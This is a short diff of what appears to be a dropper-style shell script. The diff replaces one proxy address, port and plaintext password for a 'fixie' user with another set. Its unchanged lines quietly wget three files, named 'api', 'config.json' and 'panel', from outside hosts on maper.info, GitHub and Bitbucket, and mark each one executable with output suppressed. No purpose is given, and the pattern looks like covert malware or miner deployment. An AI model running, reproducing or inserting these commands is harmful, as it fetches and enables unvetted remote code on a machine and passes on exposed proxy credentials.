@@ -1,7 +1,7 @@
-proxy="54.173.229.200" 
-port="80" 
+proxy="34.192.31.89" 
+port="1080" 
 user="fixie"  
-pass="Qrj3UKEc6UHpknH" 
+pass="NBq8RRRWjk6fEZk" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json >/dev/null 2>&1
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
